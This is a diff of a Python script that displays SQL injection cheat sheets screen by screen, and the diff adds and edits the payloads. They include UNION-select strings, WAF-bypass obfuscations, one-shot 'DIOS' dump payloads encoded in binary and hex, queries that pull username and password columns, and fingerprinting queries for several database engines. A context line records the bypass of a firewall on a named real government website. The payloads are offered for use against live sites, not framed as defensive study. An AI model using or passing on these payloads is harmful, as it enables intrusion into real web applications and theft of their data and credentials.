@@ -33,19 +33,10 @@ note=O+"""
  |: add Point before and after variable number at the same time  [.x.]
  |: Add the Apostrophe before the variable number  [']
  |: Delete the variable number and add the Apostrophe only [']
- |: Delete the variable number and add a slash  [/]
+ |: delete the variable number and add a slash  [/]
  |: Using Logical expressions  [and 1=1]
 -|----------------------------------------------------------------------------|-
-1- Single Quote ↳ '
-2- Double Quote ↳ "
-3- Letter ↳ a
-4- Adding Letter To Single Quote ↳ 'a Or To Double Quote ↳ "a
-5- Adding Dot . Befor The Variable And Then Adding Single Quote After ↳ ID=.10'
-6- Adding Dot . Befor The Variable And After The Variable IN The Same Time ↳ ID=.10.
-7- Adding Single Quote Befor Variable Number ↳ ID='10
-8- Delete The Variable Number And Just Adding Single Quote ↳ ID='
-9- Delete The Variable And Add Just Slash Condition ↳ =\
-10- Use ‫‪Logical‬‬ ‫‪Operator‬‬ ↳ And 1=1 , And 1=2
+
 """
 
 clear()
@@ -86,7 +77,7 @@ cat=.2 order by 10 -- -
 ----------------------------------------------------------------------------
 cat= 3-.1GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 asc
 ----------------------------------------------------------------------------
-cat=.4 union select version(),2-- -
+cat=.4 union select `version`/**/(/**/),2-- -
 ----------------------------------------------------------------------------
 cat=.5 union select table_name          froM+InfORmaTion_scHema.tAblES -- -
 ----------------------------------------------------------------------------
@@ -103,7 +94,12 @@ cat=.9 union select group_concat(username,0x3a,password)    from member -- -
 show staff in source 
 -------------------------------------------------------------------------
 concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
-
+-------------------------------------------------------------------------
+from information_schema.columns where table_schema=database() limit 0,1--+-
+---------------------
+limit 0,1
+limit 0,2
+limit 0,3
 """
 
 
@@ -120,7 +116,7 @@ level1=G+"""
 
 order by 100 -- -
 ----------------------------------------------------------------------------
-union select 1,2,3,4,5,6,7,8,9,10,version() -- -
+union select 1,2,3,4,5,6,7,8,9,10,`version`/**/(/**/) -- -
 ----------------------------------------------------------------------------
 union select 1,2,table_name, froM InfORmaTion_scHema.tAblES  -- -
 ----------------------------------------------------------------------------
@@ -150,7 +146,7 @@ clear()
 
 remod=""" 
 
-php?id=.1'  and .0UnIOn-- -%0ASeLeCt 1,2,3-- -
+php?id=.1'  and .0UnIOn-- -%0ASeLeCt 1,2,`version`/**/(/**/)-- -
 ----------------------------------------------------------------------------
 php?id=5 and .0UnIOn-- -%0ASeLeCt 1,2,3,4,5,6 -- -
  ----------------------------------------------------------------------------
@@ -166,10 +162,18 @@ AnD point(29,9) /*!50000UnIoN*/ /*!50000SeLeCt*/
 ----------------------------------------------------------------------------
 ' And/**/.0union/*%26*/distinctROW+select
 ----------------------------------------------------------------------------
-%75%6e%69%6f%6e--%20-%0%73%65%6c%65%63%74
- 
+id=@281' %55nIoN %53eLeCt   
+----------------------------------------------------------------------------
+id=.1'%20 and .0UnIOn-- -%0ASeLeCt 1,``0.e.table_name,.3from {f information_schema 0.e.tables} where table_schema=database() -- -
 union sele%63t
- 
+----------------------------------------------------------------------------
+d=50' and .0union SeLeCt concat#aaaaaaaaaaa
+('</script><b>',0x3c2f7363726970743e3c623e,version())-- -
+
+----------------------------------------------------------------------------
+?id=.101' Union Select 0x00,2,3,4,5,6,7,8,9,10,11,12,13,14-- -
+----------------------------------------------------------------------------
+
 %75nion %73elect
 
 and 0 /*!50000Union*/ /*!00000Select*/ 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16`
@@ -185,9 +189,49 @@ input("[Pres Enter]")
 clear()
 
 
+waf ="""
+----------------------------------------------------------------------------
+bypassing waf
+----------------------------------------------------------------------------
+/*!/*"GHI"*/   */
+
+id=.3' /*!/*"GHI"*/UnIoN*/ SeLeCt 1,2,3,4,5,6 -- -
+----------------------------------------------------------------------------
+/*!50000%55niON*/+/*!50000%53eLeCt*/ 1,2,3,4,5,6 -- -
+----------------------------------------------------------------------------
+id=.3' and .0/*!/**/UnIoN*/ /*!/**/SeLeCt*/ 1,2,3,4,5,6 -- -
+----------------------------------------------------------------------------
+union se%0Blect
+union se%0Clect
+----------------------------------------------------------------------------
+?id=2 union se%0Blect * from (se%0Blect 1)a join (se%0Blect 2)b join (se%0Blect 3)c join (se%0Blect 4)d join (se%0Blect 5)e join (se%0Blect 6)f join (se%0Blect 7)g join (se%0Blect 8)h join (se%0Blect 9)i join (se%0Blect 10)j join (se%0Blect 11)k join (se%0Blect 12)l join (se%0Blect 13)m %23a.tables+as+x+join+information_schema.tables+y+using+(TABLE_CATALOG))as+z)%23
+----------------------------------------------------------------------------
+
+And MOD(29,9) __ || 0  ___  || mod 0 __%26%26 0       ↲ && 0
+----------------------------------------------------------------------------
+ Flow Control [Function To Control ID Output]  CLI servers
+----------------------------------------------------------------------------
+
+d=@3'||!{f`id`}
+id={f -1983}'
+
+id=@3'||!{f`id`}/*!/**/UnIoN*/ /*!/**/SeLeCt*/ 1,2,3,4,5,6 -- -
+
+id={f -1983}' /*!/**/UnIoN*/ /*!/**/SeLeCt*/ 1,2,3,4,5,6 -- -
+
+id=.3'||!{f`id`}/*!/**/UnIoN*/ /*!/**/SeLeCt*/ 1,2,3,4,5,6 -- -
+
+----------------------------------------------------------------------------
+id=343-- - '  order by 35-- -
+----------------------------------------------------------------------------
+"""
 
 
+clear()
+print(waf)
 
+input("[Pres Enter]")
+clear()
 
 
 
@@ -211,6 +255,10 @@ union select group_concat(column,0x3a,column) from YOUR TABLE NAME  -- -
 
 ---------------------------------------------------------------------------------------------------------------------------------------
 
+ConCat/*Melegy*/(0x3c2f613e3c62723e,':::',version/*Melegy*/(),':::',0x3c2f613e3c62723e,':::','BlackRose',':::',0x3c2f613e3c62723e,':::',database/*Melegy*/(),':::',0x3c2f613e3c62723e,':::',user/*Melegy*/(),':::',0x3c2f613e3c62723e,0x3c2f613e3c62723e)
+----------------------------------------------------------------------------
+
+concat%0b(0b0100100101101110011010100110010101100011011101000110010101100100001000000110001001111001001000000100011001110010011011110111101001100101011011100100011001101100011000010110110101100101,'<br><br>',version(),'<br>',database(),'<br>',user(),'<br><br>',UCASE('DIOS'),' %C2%BB','<br><br>')
 """
 
 
@@ -289,6 +337,15 @@ clear()
 
 
 level2d="""
+--------------------------------------------------------------------------------------------------------------------------
+concat%23aaaaaaaaaaa%0a(0b001011100010111001001110011000010110110101100101001000000011101000111010001000000100001001101100011000010110001101101011010100
+10011011110111001101100101001000000111101101000111010010000101010001111101,0b00111100011000100111001000111110,0b00101110,0b00101110,0b010101
+1001100101011100100111001101101001011011110110111000100000001110100011101000100000,0b00101110,version%0b(),0b00111100011000100111001000111110,0b00101110
+001011100101010101110011011001010111001000100000001110100011101000100000,user%0b(),0b00111100011000100111001000111110,0b00101110001011100100010001100001
+01110100011000010110001001100001011100110110010100100000001110100011101000100000,0b00101110,database%0b(),0b00111100011000100111001000111110,0b001111000
+11000100111001000111110,0b00101110001011100100010001101001011011110111001100100000001110100011101000100000,0b00111100011000100111001000111110,0b0011110001
+1000100111001000111110,(select+reverse(insert(0x1,1,0,reverse(concat%0b(unhex(hex(group_concat(0x3c6c693e
+,``0.e.Table_name,0x2e,``0.e.Column_name))),0x3c62723e)))) %46rom {f information_schema 0.e.columns} where table_schema=database%0b()))
 --------------------------------------------------------------------------------------------------------------------------
 Pass Detection # CASE statement
 --------------------------------------------------------------------------------------------------------------------------
@@ -744,6 +801,8 @@ space%20
 =    %3D
 """
 
+
+
 clear()
 print(delta)
 input("[Pres Enter]")
@@ -772,10 +831,6 @@ cat=43' and 0 union/**/distinctrow select-- -&id=230
 cat=43' and 0 union/**/distinctrow select 1,2-- -&id=230
 ------------------------------------
 cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
-------------------------------------
-cat=43' and 0 union/**/distinctrow select 1,version()-- -&id=230
-------------------------------------
-cat=43' and 0 union/**/distinctrow Select 1,version()-- -&id=230
 
 
 .4/*!32302union*/ /**/select/**/version(),2 -- -
@@ -1347,7 +1402,7 @@ mahrukat.gov.sy/answercomplaints.php?id=12' >> waf Forbidden)
 mahrukat.gov.sy/answercomplaints.php?id=12'a >> bypassed :)
 http://mahrukat.gov.sy/answercomplaints.php?id=12a Work
 
-    http://mahrukat.gov.sy/answercomplaints.php?id=\ Error
+ http://mahrukat.gov.sy/answercomplaints.php?id=\ Error
 
 
 
@@ -1583,3 +1638,101 @@ PHP Code
 """
 
 
+
+
+
+
+
+
+
+version=="""
+
+-----------------------------------------
+`version`/**/(/**/)
+
+------------------------------------------
+MSSQL
+------------------------------------------
+@@version
+user_name()
+------------------------------------------
+------------------------------------------
+SQLite
+------------------------------------------
+sqlite_version()
+SELECT tbl_name FROM sqlite_master;
+------------------------------------------
+------------------------------------------
+Oracle
+------------------------------------------
+v$version
+SELECT banner FROM v$version;
+------------------------------------------
+------------------------------------------
+Postgres
+------------------------------------------
+version()
+SELECT datname FROM pg_database;
+SELECT usename FROM pg_user;
+SELECT c.relname FROM pg_catalog.pg_class;
+------------------------------------------
+------------------------------------------
+Informix SQL
+------------------------------------------
+version
+SELECT DBINFO(‘version’, ‘full’) FROM systables;
+SELECT tabname FROM systables;
+------------------------------------------
+------------------------------------------
+DB2
+------------------------------------------
+versionnumber
+select name from sysibm.systables;
+------------------------------------------
+------------------------------------------
+Ingres
+------------------------------------------
+dbmsinfo(‘_version’)
+select table_name from iitables;
+------------------------------------------
+
+
+id=5 UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14-- -
+
+id=5 UNION SELECT 1,tbl_name,3,4,5,6,7,8,9,10,11,12,13,14 FROM sqlite_master -- -
+
+group_concat("BlackRose"||sqlite_version()||tbl_name,"<br>")  from sqlite_master WHERE type="table"
+
+other solution from member
+------------------------------------------
+
+(select group_concat('<br>'||'SCYTHER'||sqlite_version()||tbl_name) from sqlite_master)
+------------------------------------------
+
+
+
+
+
+
+
+
+
+
+"""
+
+
+
+'''
+
+
+
+
+There are several ways to do a cross join or cartesian product:
+
+SELECT column_names FROM table1 CROSS JOIN table2;
+
+SELECT column_names FROM table1, table2;
+
+SELECT column_names FROM table1 JOIN table2
+
+'''
